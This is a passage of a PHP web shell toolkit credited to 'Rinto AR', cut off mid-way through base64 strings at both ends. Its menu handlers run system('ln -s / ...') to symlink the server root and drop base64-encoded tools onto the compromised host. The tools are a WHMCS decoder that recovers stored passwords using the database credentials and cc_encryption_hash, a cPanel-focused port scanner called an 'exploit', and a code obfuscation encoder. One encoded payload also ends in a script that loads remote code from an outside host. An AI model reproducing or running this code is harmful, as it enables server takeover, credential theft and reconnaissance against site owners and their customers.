PUk0gYWN0aW9uPSIiICBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZm9ybV9hY3Rpb24iIHZhbHVlPSIyIj4NCjxicj4NCjx0YWJsZSBib3JkZXI9MT4NCg0KPHRyPjx0ZD5kYl9ob3N0IDwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIzMCIgbmFtZT0iZGJfaG9zdCIgdmFsdWU9ImxvY2FsaG9zdCI+PC90ZD48L3RyPg0KPHRyPjx0ZD5kYl91c2VybmFtZSA8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMzAiIG5hbWU9ImRiX3VzZXJuYW1lIiB2YWx1ZT0iIj48L3RkPjwvdHI+DQo8dHI+PHRkPmRiX3Bhc3N3b3JkPC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiBuYW1lPSJkYl9wYXNzd29yZCIgdmFsdWU9IiI+PC90ZD48L3RyPg0KPHRyPjx0ZD5kYl9uYW1lPC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiBuYW1lPSJkYl9uYW1lIiB2YWx1ZT0iIj48dGQ+PC90cj4NCjx0cj48dGQ+Y2NfZW5jcnlwdGlvbl9oYXNoPC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiBuYW1lPSJjY19lbmNyeXB0aW9uX2hhc2giIHZhbHVlPSIiPjwvdGQ+PC90cj4NCg0KPC90YWJsZT4NCjxicj4NCjxJTlBVVCBjbGFzcz1zdWJtaXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0IiBuYW1lPSJTdWJtaXQiPg0KPC9GT1JNPg0KPGhyPg0KPGNlbnRlcj4NCjxmb250IGNvbG9yPSIjMDA2NkZGIiBzaXplPScrMic+UGFzc3dvcmQgZGVjb2RlcjwvZm9udD48YnI+DQo8Pw0KIGlmKCRfUE9TVFsnZm9ybV9hY3Rpb24nXSA9PSAzICkNCiB7DQoNCg0KDQogJHBhc3N3b3JkPSgkX1BPU1RbJ3Bhc3N3b3JkJ10pOw0KDQogJGNjX2VuY3J5cHRpb25faGFzaD0oJF9QT1NUWydjY19lbmNyeXB0aW9uX2hhc2gnXSk7DQoNCg0KJHBhc3N3b3JkID0gZGVjcnlwdCAoJHBhc3N3b3JkLCAkY2NfZW5jcnlwdGlvbl9oYXNoKTsNCg0KZWNobygiUGFzc3dvcmQgaXMgIi4kcGFzc3dvcmQpOw0KDQp9DQo/Pg0KPC9jZW50ZXI+DQo8Rk9STSBhY3Rpb249IiIgIG1ldGhvZD0icG9zdCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmb3JtX2FjdGlvbiIgdmFsdWU9IjMiPg0KPGJyPg0KPHRhYmxlIGJvcmRlcj0xPg0KDQo8dHI+PHRkPlBhc3N3b3JkPC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiBuYW1lPSJwYXNzd29yZCIgdmFsdWU9IiI+PC90ZD48L3RyPg0KPHRyPjx0ZD5jY19lbmNyeXB0aW9uX2hhc2g8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMzAiIG5hbWU9ImNjX2VuY3J5cHRpb25faGFzaCIgdmFsdWU9IiI+PC90ZD48L3RyPg0KDQo8L3RhYmxlPg0KPGJyPg0KPElOUFVUIGNsYXNzPXN1Ym1pdCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiIG5hbWU9IlN1Ym1pdCI+DQo8L0ZPUk0+DQo8aHI+DQoNCg0KICA8Y2VudGVyPiA8Zm9udCBjb2xvcj0iI0ZGRkY2RkYiIHNpemU9JysxJz4gICBDb2RlZCBCeSBSaW50byBBUiAgICA8L2ZvbnQ+PGJyPjxicj4gPGNlbnRlcj4=';
			$file = fopen("whmcs-decoder.php","w+"); $write = fwrite ($file ,base64_decode($mrlolo)); $file = fopen("/","whmcs-decoder.php");
			$rt="<br><a href=whmcs-decoder.php TARGET='_blank'>";
	echo "<br><br><br><a href=whmcs-decoder.php TARGET='_blank'><b>Done.. !</a></b><br><br>$rt</center>";} echo "</form>";

} elseif($_GET['do'] == 'ports') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Tool Ports Scanner By Rinto AR</font><br><br>";
	echo "<center><input type='submit' value='Make File' name='Ngntd'></center>";
		if (isset($_POST['Ngntd'])){ system('ln -s / port-scanner.php');
			$blowjob ='PD9waHANCnNldF90aW1lX2xpbWl0KDkwMDAwMCk7DQokbXNnID0gIiI7DQpmdW5jdGlvbiBQb3J0X0FjaWsoJGRvbWFpbiwkcG9ydCkNCnsNCglpZihAZnNvY2tvcGVuKCRkb21haW4sICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDAuMSkpDQoJew0KCQlyZXR1cm4gdHJ1ZTsNCgl9DQoJZWxzZQ0KCXsNCgkgICByZXR1cm4gZmFsc2U7DQoJfQ0KfQ0KZnVuY3Rpb24gUG9ydF9TZXJ2aXNfQWRpKCRpbmRleCkNCnsNCgkkcG9ydF9hZGxhcmkgPSBhcnJheSgiRlRQIiwiU1NIIiwiVEVMTkVUIiwiU01UUCIsIkROUyIsIkhUVFAiLCJQT1AzIiwiU0ZUUCIsIlJQQyIsIk5ldEJJT1MiLCJJTUFQIiwiSVJDIiwiU1NMIiwiU01CIiwiTVNTUUwiLCJNeVNRTCIsIlJlbW90ZSBEZXNrdG9wIiwiUENBbnl3aGVyZSIsIlZOQyIsIldhcmNyYWZ0IElJSSIpOw0KCWlmKGlzX251bWVyaWMoJGluZGV4KSkNCgl7DQoJCXJldHVybiAkcG9ydF9hZGxhcmlbJGluZGV4XTsNCgl9DQoJZWxzZQ0KCXsNCgkJcmV0dXJuIG51bGw7DQoJfQ0KfQ0KZnVuY3Rpb24gRXJpc2lsbWUoJGRvbWFpbikNCnsNCgkkTEwgPSBjdXJsX2luaXQoKTsNCgljdXJsX3NldG9wdCgkTEwsQ1VSTE9QVF9VUkwsJGRvbWFpbik7DQoJY3VybF9zZXRvcHQoJExMLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCgkkc29udWMgPSBodG1sc3BlY2lhbGNoYXJzKEBjdXJsX2V4ZWMoJExMKSk7DQoJY3VybF9jbG9zZSgkTEwpOw0KCWlmKCRzb251YyAhPSAiIikNCgl7DQoJCXJldHVybiB0cnVlOw0KCX0NCgllbHNlDQoJew0KCQlyZXR1cm4gZmFsc2U7DQoJfQ0KfQ0KPz4NCjw/cGhwDQokaXNsZW0gPSBAJF9HRVRbImlzbGVtIl07DQpzd2l0Y2goQCRpc2xlbSkNCnsNCgljYXNlICJ0YXJhIjoNCgkkc2l0ZSA9IGh0bWxzcGVjaWFsY2hhcnMoQCRfUE9TVFsidHh0c2l0ZSJdKTsNCglpZigkc2l0ZSA9PSAiIikNCgl7DQoJJG1zZyA9ICI8cCBjbGFzcz1cInNpdGlsX2hhdGFcIj5CbGFuayBEbyBub3QgY3Jvc3MgeW91ciBzaXRlICE8L3A+XHJcbiI7DQoJJHNvbnVjbGFyID0gdHJ1ZTsNCgl9DQoJZWxzZQ0KCXsNCgkJJHBvcnRsYXIgPSBhcnJheSgiMjEiLCIyMiIsIjIzIiwiMjUiLCI1MyIsIjgwIiwiMTEwIiwiMTE1IiwiMTM1IiwiMTM5IiwiMTQzIiwiMTk0IiwiNDQzIiwiNDQ1IiwiMTQzMyIsIjMzMDYiLCIzMzg5IiwiNTYzMiIsIjU5MDAiLCI2MTEyIik7DQoJCSRfY3BhbmVsX3BvcnQgPSBhcnJheSgiMTk5NyIsIjE5OTgiLCIxOTk5IiwiMjAwMCIsIjIwMDEiLCIyMDAyIiwiMjAwNCIsIjIwMDUiLCIyMDA2IiwiMjAwNyIsIjIwMDgiLCIyMDA5IiwiMjAxMCIsIjIwMTEiLCIyMDEyIiwiMjAxMyIsIjIwMTQiLCIyMDE1IiwiMjAxNiIsIjIwMTciLCIyMDE4IiwiMjAxOSIsIjIwMjAiLCIyMDIxIiwiMjAyMiIsIjIwMjMiLCIyMDI0IiwiMjAyNSIsIjIwMjYiLCIyMDI3IiwiMjAyOCIsIjIwMjkiLCIyMDMwIiwiMjAzMSIsIjIwMzIiLCIyMDMzIiwiMjAzNCIsIjIwMzUiLCIyMDM2IiwiMjAzNyIsIjIwMzgiLCIyMDM5IiwiMjA0MCIsIjIwNDEiLCIyMDQyIiwiMjA0MyIsIjIwNDQiLCIyMDQ1IiwiMjA0NiIsIjIwNDciLCIyMDQ4IiwiMjA0OSIsIjIwNTAiLCIyMDUxIiwiMjA1MiIsIjIwNTMiLCIyMDU0IiwiMjA1NSIsIjIwNTYiLCIyMDU3IiwiMjA1OCIsIjIwNTkiLCIyMDYwIiwiMjA2MSIsIjIwNjIiLCIyMDYzIiwiMjA2NCIsIjIwNjUiLCIyMDY2IiwiMjA2NyIsIjIwNjgiLCIyMDY5IiwiMjA3MCIsIjIwNzEiLCIyMDcyIiwiMjA3MyIsIjIwNzQiLCIyMDc1IiwiMjA3NiIsIjIwNzciLCIyMDc4IiwiMjA3OSIsIjIwODAiLCIyMDgxIiwiMjA4MiIsIjIwODMiLCIyMDg0IiwiMjA4NSIsIjIwODYiLCIyMDg3IiwiMjA4OCIsIjIwODkiLCIyMDkwIiwiMjA5MSIsIjIwOTIiLCIyMDkzIiwiMjA5NCIsIjIwOTUiLCIyMDk2IiwiMjA5NyIsIjg0NDMiKTsNCgkJZm9yKCRpID0gMDskaTxjb3VudCgkcG9ydGxhcik7JGkrKykNCgkJew0KCQkJJHNvbnVjID0gUG9ydF9TZXJ2aXNfQWRpKCRpKS4ioDqgIi4oUG9ydF9BY2lrKCRzaXRlLCRwb3J0bGFyWyRpXSkgPT0gdHJ1ZSA/ICI8Zm9udCBjb2xvcj1cImxpbWVcIj5PcGVuPC9mb250PiIgOiAiPGZvbnQgY29sb3I9XCJyZWRcIj5PZmY8L2ZvbnQ+Iik7DQoJCQkkbXNnIC49ICI8Zm9udCBjb2xvcj1cImxpbWVcIj48Yj4iLiRzaXRlLiIgRGVraaAiLiRzb251Yy4iID0+ICIuJHBvcnRsYXJbJGldLiI8L2I+PC9mb250PjxiciAvPlxyXG4iOw0KCQl9DQoJCSRtc2cgLj0gIjxmb250IGNvbG9yPVwibGltZVwiPlNlcnZlciBJUCBhZGRyZXNzIDqgIi5nZXRob3N0YnluYW1lKCRzaXRlKS4iPC9mb250PjxiciAvPlxyXG4iOw0KCQlmb3IoJGkgPSAwOyRpPGNvdW50KCRfY3BhbmVsX3BvcnQpOyRpKyspDQoJCXsNCgkJCSRzb251YyA9ICJDcGFuZWwtUG9ydHUgOqAiLiRfY3BhbmVsX3BvcnRbJGldLihQb3J0X0FjaWsoJHNpdGUsJF9jcGFuZWxfcG9ydFskaV0pID09IHRydWUgPyAioDxmb250IGNvbG9yPVwibGltZVwiPjxiPk9wZW48L2I+PC9mb250PiIgOiAioDxmb250IGNvbG9yPVwicmVkXCI+PGI+T2ZmPC9iPjwvZm9udD4iKTsNCgkJCSRtc2cgLj0gIjxmb250IGNvbG9yPVwibGltZVwiPjxiPiIuJHNpdGUuIiBEZWtpICIuJHNvbnVjLiIgRXJp/mlsbWUgRHVydW11IDo8L2I+PC9mb250PiIuKEVyaXNpbG1lKCJodHRwOi8vIi4kc2l0ZS4iOiIuJF9jcGFuZWxfcG9ydFskaV0uIi8iKSA9PSB0cnVlID8gIjxmb250IGNvbG9yPVwibGltZVwiPjxiPmFjY2Vzc2libGUgITwvYj48L2ZvbnQ+IiA6ICI8Zm9udCBjb2xvcj1cInJlZFwiPjxiPmluYWNjZXNzaWJsZSAhPC9iPjwvZm9udD4iKS4iPGJyIC8+XHJcbiI7DQoJCX0NCgkJJG1zZyAuPSAiPGgxIGNsYXNzPVwiLnNpdGlsX2gxXCI+aW4gZXhjZXB0aW9uYWwgY2lyY3Vtc3RhbmNlcyA6PC9oMT48YnIgLz5cclxuIjsNCgkJZm9yKCRpID0gMDskaTxjb3VudCgkcG9ydGxhcik7JGkrKykNCgkJew0KCQkJJHNvbnVjID0gIjxmb250IGNvbG9yPVwibGltZVwiPjxiPiIuUG9ydF9TZXJ2aXNfQWRpKCRpKS4gIqBFcmn+aWxtZSA6IDwvYj48L2ZvbnQ+Ii4oRXJpc2lsbWUoImh0dHA6Ly8iLiRzaXRlLiI6Ii4kcG9ydGxhclskaV0uIi8iKSA9PSB0cnVlID8gIjxmb250IGNvbG9yPVwibGltZVwiPjxiPmFjY2Vzc2libGUgITwvYj48L2ZvbnQ+IiA6ICI8Zm9udCBjb2xvcj1cInJlZFwiPjxiPmluYWNjZXNzaWJsZSAhPC9iPjwvZm9udD4iKTsNCgkJCSRtc2cgLj0gJHNpdGUuIiA8Zm9udCBjb2xvcj1cImxpbWVcIj48Yj5pbiBleGNlcHRpb25hbCBjaXJjdW1zdGFuY2VzIDqgPC9iPjwvZm9udD6gIi4kc29udWMuIjxiciAvPlxyXG4iOw0KCQl9DQoJCSRtc2cgLj0gIjxmb250IGNvbG9yPVwicmVkXCI+PGI+SHR0cCwgZnRwLCBldGMuIGR1ZSB0byB1bnVzdWFsIHBvcnRzITwvYj48L2ZvbnQ+XHJcbiI7DQoJCSRzb251Y2xhciA9IHRydWU7DQoJfQ0KCWJyZWFrOw0KCWRlZmF1bHQ6DQp9DQo/Pg0KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS05IiAvPg0KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjU0IiAvPg0KPHRpdGxlPlJpbnRvIEFSIFBvcnQgU2Nhbm5lciBFeHBsb2l0PC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+IGJvZHkgeyBiYWNrZ3JvdW5kOiMxNTE1MTU7IGZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldzsgZm9udC1zaXplOiAxMHB0OyBmb250LXdlaWdodDogNDAwOyBjb2xvcjogIzU4RkFGNDsgdGV4dC1hbGlnbjogY2VudGVyOyB9DQouc2l0aWxfYnV0dG9uew0KYmFja2dyb3VuZC1jb2xvcjojMDAwMDAwOw0KY29sb3I6IzU4RkFGNDsNCmJvcmRlcjoxcHggc29saWQgIzU4RkFGNDsNCn0NCi5zaXRpbF9oMXsNCmNvbG9yOiNDQzMzMDA7DQp9DQouc2l0aWxfaGF0YXsNCmNvbG9yOiNGRjAwMDA7DQpmb250LWZhbWlseToiQXJpYWwgQmxhY2siOw0KZm9udC1zaXplOjIwcHQ7DQp9DQo8L3N0eWxlPjwvaGVhZD4NCjxib2R5Pg0KPGJyPg0KPGZvcm0gYWN0aW9uPSI/aXNsZW09U2NhbiIgbWV0aG9kPSJwb3N0IiBuYW1lPSJmb3JtMSIgaWQ9ImZvcm0xIj4NCiAgPHRhYmxlIHdpZHRoPSI1MzAiIGJvcmRlcj0iMSIgYWxpZ249ImNlbnRlciI+DQogICAgPHRyPg0KICAgICAgPHRkIHdpZHRoPSI5NiIgYWxpZ249InJpZ2h0Ij48c3BhbiBjbGFzcz0ic2l0aWxfeWF6aSI+PHN0cm9uZz5VcmwgU2l0ZSA6PC9zdHJvbmc+PC9zcGFuPjwvdGQ+DQogICAgICA8dGQgd2lkdGg9IjI0NiIgYWxpZ249ImxlZnQiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0eHRzaXRlIiBpZD0idHh0c2l0ZSIgc3R5bGU9IndpZHRoOjMwMHB4OyIgIGNsYXNzPSJzaXRpbF9idXR0b24iLz4gPGlucHV0IG5hbWU9ImJ0blRhcmEiIHR5cGU9InN1Ym1pdCIgY2xhc3M9InNpdGlsX2J1dHRvbiIgaWQ9ImJ0blRhcmEiIHN0eWxlPSJ3aWR0aDoxMDBweDsiIHZhbHVlPSJTY2FuIiBvbmNsaWNrPSJKYXZhc2NyaXB0OnJldHVybiBjb25maXJtKCdBcmUgeW91IHJlYWR5IHRvIHNjYW4gPycpOyIgLz48L3RkPg0KICAgIDwvdHI+DQogICAgPHRyPg0KICAgICAgPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KICAgICAgPGRpdiBzdHlsZT0id2lkdGg6NTUwcHg7aGVpZ2h0OjEwMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50O2NvbG9yOmxpbWU7IG92ZXJmbG93OnZpc2libGU7IiBhbGlnbj0iY2VudGVyIj48Y29kZT5Vc2VyIHlvdXIgYnJhaW4gOikgLCBzbyBzaG93IHdobyBhcmUgdS4uLiA8L2NvZGU+PC9kaXY+PC90ZD4NCiAgICA8L3RyPg0KICA8L3RhYmxlPg0KPC9mb3JtPg0KPD9waHAgaWYoQCRzb251Y2xhciA9PSB0cnVlKSB7ID8+DQo8aDEgYWxpZ249ImNlbnRlciIgY2xhc3M9InNpdGlsX2gxIj5TY2FuIFJlc3VsdHMgOjwvaDE+PGJyIC8+DQo8P3BocCBlY2hvIEAkbXNnOyA/Pg0KPD9waHAgfSA/Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmlmIChzZWxmPT10b3ApIHtmdW5jdGlvbiBuZXRicm9fY2FjaGVfYW5hbHl0aWNzKGZuLCBjYWxsYmFjaykge3NldFRpbWVvdXQoZnVuY3Rpb24oKSB7Zm4oKTtjYWxsYmFjaygpO30sIDApO31mdW5jdGlvbiBzeW5jKGZuKSB7Zm4oKTt9ZnVuY3Rpb24gcmVxdWVzdENmcygpe3ZhciBpZGNfZ2xvX3VybCA9IChsb2NhdGlvbi5wcm90b2NvbD09Imh0dHBzOiIgPyAiaHR0cHM6Ly8iIDogImh0dHA6Ly8iKTt2YXIgaWRjX2dsb19yID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKjk5OTk5OTk5OTk5KTt2YXIgdXJsID0gaWRjX2dsb191cmwrICJjZnMyLnV6b25lLmlkLzJmbjdhMi9yZXF1ZXN0IiArICI/aWQ9MSIgKyAiJmVuYz05VXdreExnWTkiICsgIrZtcz0iICsgIjRUdEhhVVFuVUVpUDZLJTJmYzVDNTgyRUNTYUxkd3FTcG51V1ZkTkR2VkxKZFBzd3pyU3B0SUprWGR5WGF4RTZLdCUyZktaQmFpblRiZ1laZGNPVXF3S3Jjb2NLeWkxN3VCTDVlUmR6MDg0RXRYT0Q3OTFKQXZ0clRRV1hkRG9FNENrQmVudFZJWk9uc2VqNTh4dU5hWUUyYTBkbmJjUVV6cnhqaHJGSHJIQzdLd2g2diUyYnQ3Qlc5UmJPc0p2JTJibzIxayUyYnhNWW1mdDNGdWFDb2hXaVpnOVgyMDk3aCUyYng0dENkeGlYVnVMSk5rMXpPcGx1T0J0WTl4UldKWlRndWZpcW9tOXloNDRuYjI4aTZxTThBNDlZNUxNOW1wQ0JPb2lBTkxNY3V1U2sxUk5GTEpIdlo2elhBZHFoTmVOQkllRVNaZUpWTW5Ud1A0UllDWm1VaXdVJTJmM3dtaXN4TTFFM2tycGlzU05EZ002S3Q5b3Y5Z08lMmY2eEdyMlRDTUZKVjgyMzhPRVc1aGxaYnN3VlZnbzQwektITTZNMU1MJTJiSE8lMmJGMmZyVVprNklEYUJUclNJWjA3R0ZpJTJmOGx1dDhpdFlJYmhsSGQlMmJ5RFlWYUxRY0J5Vm5uOXcwbVVxJTJmZktBdTF0NlNEUGFFUFFkQmpQTjFYQ0JzSnBrc0tqRWZpMThkQUxxdHlKVUY5V3pCendWUzU0NDZhVm9BR0lIalpUY3k5JTJmeVVRbU9EQlJSUXVqelVYRk1ISUszVWs5REhqQSUzZCUzZCIgKyAiJmlkY19yPSIraWRjX2dsb19yICsgIiZkb21haW49Iitkb2N1bWVudC5kb21haW4gKyAiJnN3PSIrc2NyZWVuLndpZHRoKyImc2g9IitzY3JlZW4uaGVpZ2h0O3ZhciBic2EgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtic2EudHlwZSA9ICd0ZXh0L2phdmFzY3JpcHQnO2JzYS5hc3luYyA9IHRydWU7YnNhLnNyYyA9IHVybDsoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2JvZHknKVswXSkuYXBwZW5kQ2hpbGQoYnNhKTt9bmV0YnJvX2NhY2hlX2FuYWx5dGljcyhyZXF1ZXN0Q2ZzLCBmdW5jdGlvbigpe30pO307PC9zY3JpcHQ+PC9ib2R5Pg0KPC9odG1sPg0K';
			$file = fopen("port-scanner.php","w+"); $write = fwrite ($file ,base64_decode($blowjob)); $file = fopen("/","port-scanner.php");
			$rt="<br>";
	echo "<br><a href=port-scanner.php TARGET='_blank'><b>Done.. !</a></b><br><br>$rt</center>";} echo "</form>";

} elseif($_GET['do'] == 'decode') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Tools Auto Encode/Decode Your Script</font><br><br>";
	echo "<center><input type='submit' value='Make File' name='Netnot'></center>";
		if (isset($_POST['Netnot'])){ system('ln -s / decode.php');
			$netnotahh ='PD9waHAgDQovKiANCiBDb2RlZCBieSBSaW50byBBUg0KICovDQpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsMCk7IA0KQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQokdGV4dCA9ICRfUE9TVFsnbWJ1dHQnXTsNCj8+DQo8dGl0bGU+VG9vbHMgQXV0byBFbmNvZGVkL0RlY29kZWQ8L3RpdGxlPg0KPGJvZHkgPg0KPFNUWUxFPg0KYm9keSx0ZCx0aCB7YmFja2dyb3VuZDojMTUxNTE1O107YmFja2dyb3VuZDojMTUxNTE1O2JhY2tncm91bmQtc2l6ZToxMDAlOw0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDtmb250LWZhbWlseTogVmVyZGFuYTtmb250LXNpemU6IDEycHg7Y29sb3I6ICMwMEZGMDA7Zm9udC13ZWlnaHQ6IGJvbGQ7DQpiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6Zml4ZWQ7fQ0KPC9TVFlMRT4NCjxjZW50ZXI+DQo8YnI+DQo8Zm9udCBzaXplPSI3IiBmYWNlPSJjaGlsbGVyIiBjb2xvcj0id2hpdGUiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogMCAwIDZweCAjRkYwMDAwLCAwIDAgNXB4ICNGRjAwMDAsIDAgMCA1cHggI0ZGMDAwMDsiPjxiPlJpbnRvIEFSIDxmb250IHN0eWxlPSJvcGFjaXR5OjAuNDA7Ij5YYWkgU3luZGljYXRlPC9mb250PjwvZm9udD48L2I+DQo8YnI+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPjxicj4NCjx0ZXh0YXJlYSBjbGFzcz0naW5wdXR6JyBjb2xzPTMwIHJvd3M9NSBuYW1lPSJtYnV0dCIgc3R5bGU9ImJhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsiPjwvdGV4dGFyZWE+PGJyPjxicj4NCjxzZWxlY3QgY2xhc3M9J2lucHV0eicgc2l6ZT0iMSIgbmFtZT0ib3BlIiBzdHlsZT0iYmFja2dyb3VuZDpyZWQ7Y29sb3I6YXF1YTsiPg0KPG9wdGlvbiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+PGNlbnRlcj5bI10gRW5jcnlwdGlvbiBbI108L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InVybGVuY29kZSIgc3R5bGU9J2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsnPnVybDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iYmFzZTY0IiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+QmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJ1ciIgc3R5bGU9J2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsnPmNvbnZlcnRfdXU8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9Impzb24iIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5qc29uPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJnemluZmxhdGVzIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+Z3ppbmZsYXRlIC0gYmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJzdHIyIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+c3RyX3JvdDEzIC0gYmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJnemluZmxhdGUiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5zdHJfcm90MTMgLSBnemluZmxhdGUgLSBiYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9Imd6aW5mbGF0ZXIiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5nemluZmxhdGUgLSBzdHJfcm90MTMgLSBiYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9Imd6aW5mbGF0ZXgiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5nemluZmxhdGUgLSBzdHJfcm90MTMgLSBnemluZmxhdGUgLSBiYXNlNjQ8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9Imd6aW5mbGF0ZXciIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5zdHJfcm90MTMgLSBjb252ZXJ0X3V1IC0gdXJsIC0gZ3ppbmZsYXRlIC0gc3RyX3JvdDEzIC0gYmFzZTY0IC0gY29udmVydF91dSAtIGd6aW5mbGF0ZSAtIHVybCAtIHN0cl9yb3QxMyAtIGd6aW5mbGF0ZSAtIGJhc2U2NDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ic3RyIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+c3RyX3JvdDEzIC0gZ3ppbmZsYXRlIC0gc3RyX3JvdDEzIC0gYmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJ1cmwiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5iYXNlNjQgLSBnemluZmxhdGUgLSBzdHJfcm90MTMgLSBjb252ZXJ0X3V1IC0gZ3ppbmZsYXRlIC0gYmFzZTY0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJoZXhlbmNvZGUiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5IZXggRW5jb2RlL0RlY29kZTwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ibWQ1IiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+PGNlbnRlcj5NRDUgSGFzaDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ic2hhMSIgc3R5bGU9J2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6YXF1YTsnPlNIQTEgSGFzaDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ic3RyX3JvdDEzIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+Uk9UMTMgSGFzaDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0ic3RybGVuIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+c3RybGVuPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJ4eHgiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz51bmVzY2FwZTwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT0iYmJiIiBzdHlsZT0nYmFja2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjphcXVhOyc+Y2hhckF0PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJhYWEiIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxdWE7Jz5jaHIgLSBiaW4yaGV4IC0gc3Vic3RyPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJ3d3ciIHN0eWxlPSdiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOmFxd